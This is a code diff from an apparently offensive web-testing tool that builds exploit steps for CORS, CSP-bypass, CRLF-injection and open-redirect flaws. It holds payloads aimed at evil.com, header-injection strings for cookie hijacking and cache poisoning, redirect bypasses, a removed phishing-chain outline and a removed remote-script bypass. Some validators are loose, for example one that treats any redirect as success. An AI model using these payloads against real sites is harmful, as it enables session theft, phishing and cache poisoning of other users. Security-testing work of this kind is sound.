-            {"title": "Verify CORS reflects arbitrary origin",
-             "command": f"{_curl(target, '-v -H \"Origin: https://evil.com\"')} 2>&1 | grep -i 'access-control'",
-             "note": "Look for Access-Control-Allow-Origin: https://evil.com"},
-            {"title": "Check if credentials are allowed",
-             "command": f"{_curl(target, '-v -H \"Origin: https://evil.com\"')} 2>&1 | grep -i 'access-control-allow-credentials'",
-             "note": "true = critical — authenticated data can be stolen cross-origin"},
+            {"title": "Test CORS with evil.com origin",
+             "request": _get(target, extra_headers={"Origin": "https://evil.com"}),
+             "validate": _cors_check("https://evil.com"),
+             "note": "Look for reflected origin in ACAO header"},
+            {"title": "Check credentials allowed",
+             "request": _get(target, extra_headers={"Origin": "https://evil.com"}),
+             "validate": _cors_check("https://evil.com"),
+             "note": "ACAC: true = authenticated data theft possible"},
             {"title": "Test null origin (sandbox bypass)",
-             "command": f"{_curl(target, '-v -H \"Origin: null\"')} 2>&1 | grep -i 'access-control'",
-             "note": "Origin: null reflected = exploitable via sandboxed iframe"},
+             "request": _get(target, extra_headers={"Origin": "null"}),
+             "validate": _cors_check("null"),
+             "note": "null origin = exploitable via sandboxed iframe"},
             {"title": "Generate CORS data theft page",
              "command": "(file will be generated automatically)",
              "generate_file": {
@@ -3110,130 +3243,92 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "csp_bypass":
-        csp_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>CSP Bypass Analysis</h2>\n"
-            f"<p><strong>Target:</strong> {target}</p>\n"
-            f"<h3>Exploitation based on CSP weakness:</h3>\n"
-            f"<ul>\n"
-            f"<li><strong>unsafe-inline:</strong> Direct &lt;script&gt; injection works</li>\n"
-            f"<li><strong>unsafe-eval:</strong> eval(), Function(), setTimeout() with strings</li>\n"
-            f"<li><strong>* wildcard:</strong> Load scripts from any domain</li>\n"
-            f"<li><strong>Missing default-src:</strong> Fall back to permissive defaults</li>\n"
-            f"</ul>\n"
-            f"<h3>Bypass Payloads:</h3>\n"
-            f"<pre>unsafe-inline: &lt;script&gt;alert(1)&lt;/script&gt;\n"
-            f"unsafe-eval: &lt;img src=x onerror=\"eval('alert(1)')\"&gt;\n"
-            f"Wildcard: &lt;script src='https://evil.com/xss.js'&gt;&lt;/script&gt;\n"
-            f"JSONP callback: &lt;script src='https://allowed-cdn.com/api?callback=alert'&gt;&lt;/script&gt;</pre>\n"
-            f"</body></html>"
-        )
+        def _csp_check(r: ExploitResult):
+            csp = r.response_headers.get("Content-Security-Policy", "")
+            issues = []
+            if "unsafe-inline" in csp:
+                issues.append("unsafe-inline")
+            if "unsafe-eval" in csp:
+                issues.append("unsafe-eval")
+            if "script-src *" in csp or "default-src *" in csp:
+                issues.append("wildcard")
+            if not csp:
+                issues.append("no CSP header")
+            if issues:
+                r.success = True
+                r.confidence = 0.8
+                r.evidence = f"CSP weaknesses: {', '.join(issues)}"
+                r.false_positive_risk = "low"
+            else:
+                r.evidence = f"CSP appears strong: {csp[:100]}"
+
         steps = [
-            {"title": "Retrieve full CSP header",
-             "command": f"{_curl(target, '-I')} | grep -i 'content-security-policy'",
-             "note": "Analyze directives for weaknesses"},
-            {"title": "Check for unsafe-inline",
-             "command": f"{_curl(target, '-I')} | grep -i 'unsafe-inline'",
-             "note": "If present: direct <script> injection bypasses CSP"},
-            {"title": "Check for unsafe-eval",
-             "command": f"{_curl(target, '-I')} | grep -i 'unsafe-eval'",
-             "note": "If present: eval(), Function(), setTimeout with strings all work"},
-            {"title": "Generate CSP bypass reference",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"csp_bypass_{secrets.token_hex(3)}.html",
-                 "content": csp_html,
-                 "note": "CSP bypass analysis and payload reference.",
-             }},
+            {"title": "Analyze CSP header",
+             "request": {"method": "HEAD", "url": target},
+             "validate": _csp_check,
+             "note": "Checks for unsafe-inline, unsafe-eval, wildcards"},
         ]
 
     elif etype == "crlf":
-        crlf_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>CRLF Injection PoC</h2>\n"
-            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
-            f"<p><strong>Parameter:</strong> {param}</p>\n"
-            f"<h3>Payloads:</h3>\n"
-            f"<table border='1' cellpadding='5'>\n"
-            f"<tr><th>Attack</th><th>Payload</th></tr>\n"
-            f"<tr><td>Cookie injection</td><td>%0d%0aSet-Cookie: session=hijacked</td></tr>\n"
-            f"<tr><td>XSS via splitting</td><td>%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</td></tr>\n"
-            f"<tr><td>Cache poisoning</td><td>%0d%0aX-Forwarded-Host: evil.com</td></tr>\n"
-            f"<tr><td>Redirect</td><td>%0d%0aLocation: https://evil.com</td></tr>\n"
-            f"</table>\n"
-            f"</body></html>"
-        )
-        steps = [
-            {"title": "Inject HTTP header (Set-Cookie)",
-             "command": _curl_param("%0d%0aSet-Cookie:%20session=hijacked", "-v"),
-             "note": "Check response headers for injected Set-Cookie"},
-            {"title": "Inject Location header (redirect)",
-             "command": _curl_param("%0d%0aLocation:%20https://evil.com", "-v"),
-             "note": "Check if response contains injected Location header"},
-            {"title": "Response splitting (XSS)",
-             "command": _curl_param("%0d%0a%0d%0a" + quote("<script>alert(1)</script>"), "-v"),
-             "warning": "HTTP response splitting for XSS"},
-            {"title": "Cache poisoning attempt",
-             "command": _curl_param("%0d%0aX-Forwarded-Host:%20evil.com", "-v"),
-             "note": "If cached, subsequent users get poisoned response",
-             "warning": "May affect other users of the target"},
-            {"title": "Generate CRLF payload reference",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"crlf_payloads_{secrets.token_hex(3)}.html",
-                 "content": crlf_html,
-                 "note": "CRLF injection payload reference.",
-             }},
+        def _crlf_check(r: ExploitResult):
+            hdrs = str(r.response_headers)
+            if "session=hijacked" in hdrs or "X-Injected" in hdrs:
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = "Injected header appears in response"
+                r.false_positive_risk = "low"
+
+        crlf_payloads = [
+            ("Cookie injection", "%0d%0aSet-Cookie:%20session=hijacked"),
+            ("Location redirect", "%0d%0aLocation:%20https://evil.com"),
+            ("Cache poisoning", "%0d%0aX-Forwarded-Host:%20evil.com"),
         ]
+        steps = []
+        for name, payload in crlf_payloads:
+            steps.append({
+                "title": f"CRLF: {name}",
+                "request": _get_param(payload),
+                "validate": _crlf_check,
+                "note": f"Injecting via {name}",
+                "warning": name,
+            })
 
     elif etype == "open_redirect":
-        redir_html = (
-            f"<!DOCTYPE html>\n<html><body>\n"
-            f"<h2>Open Redirect PoC</h2>\n"
-            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
-            f"<p><strong>Parameter:</strong> {param}</p>\n"
-            f"<h3>Redirect Payloads:</h3>\n"
-            f"<pre>https://evil.com\n"
-            f"//evil.com\n"
-            f"/\\evil.com\n"
-            f"https://target.com@evil.com\n"
-            f"https://evil.com#@target.com\n"
-            f"javascript:alert(1) (if href-based)\n"
-            f"%2f%2fevil.com (URL encoded)</pre>\n"
-            f"<h3>Phishing Chain:</h3>\n"
-            f"<p>1. Craft redirect URL: {target_base}?{param}=https://evil.com/phish</p>\n"
-            f"<p>2. Phishing page mimics target login</p>\n"
-            f"<p>3. Victim trusts the URL (starts with legit domain)</p>\n"
-            f"</body></html>"
-        )
+        def _redir_check(r: ExploitResult):
+            loc = r.response_headers.get("Location", "")
+            if "evil.com" in loc or r.status_code in (301, 302, 303, 307, 308):
+                r.success = True
+                r.confidence = 0.85
+                r.evidence = f"Redirect to: {loc[:100]}"
+                r.false_positive_risk = "low"
+            elif r.status_code == 200:
+                r.evidence = "No redirect — server may handle internally"
+
         _host = base_url.split("//")[1].split("/")[0] if "//" in base_url else "target.com"
-        steps = [
-            {"title": "Confirm redirect to external domain",
-             "command": f"{_curl(target, '-v')} 2>&1 | grep -i 'location'",
-             "note": "Location header should point to evil domain"},
-            {"title": "Test double-slash bypass",
-             "command": f"{_curl_param(quote('//evil.com'), '-v')} 2>&1 | grep -i 'location'",
-             "note": "Protocol-relative redirect bypasses some scheme checks"},
-            {"title": "Test @ symbol bypass",
-             "command": f"{_curl_param(quote('https://' + _host + '@evil.com'), '-v')} 2>&1 | grep -i 'location'",
-             "note": "URL with @ may bypass domain validation"},
-            {"title": "Test URL-encoded payload",
-             "command": f"{_curl_param('%68%74%74%70%73%3a%2f%2fevil.com', '-v')} 2>&1 | grep -i 'location'",
-             "note": "URL-encoded redirect may bypass input filters"},
-            {"title": "Generate open redirect reference",
-             "command": "(file will be generated automatically)",
-             "generate_file": {
-                 "filename": f"redirect_payloads_{secrets.token_hex(3)}.html",
-                 "content": redir_html,
-                 "note": "Open redirect bypass techniques and phishing chain documentation.",
-             }},
+        redirect_payloads = [
+            ("Direct URL", "https://evil.com"),
+            ("Protocol-relative", "//evil.com"),
+            ("@ bypass", f"https://{_host}@evil.com"),
+            ("URL-encoded", "%68%74%74%70%73%3a%2f%2fevil.com"),
         ]
+        steps = [
+            {"title": "Confirm original redirect",
+             "request": _get(target),
+             "validate": _redir_check,
+             "note": "Check Location header"},
+        ]
+        for name, payload in redirect_payloads:
+            steps.append({
+                "title": f"Redirect bypass: {name}",
+                "request": _get_param(payload),
+                "validate": _redir_check,
+                "note": f"Testing {name} bypass",
+            })
 
     else:
         steps = [
             {"title": f"Manual verification for {etype}",
-             "command": f"# Evidence: {ei.get('method', 'See report for details')[:100]}",
-             "note": "Follow the exploit method described above"},
+             "note": f"Evidence: {ei.get('method', 'See report for details')[:100]}"},
         ]
 
     return steps
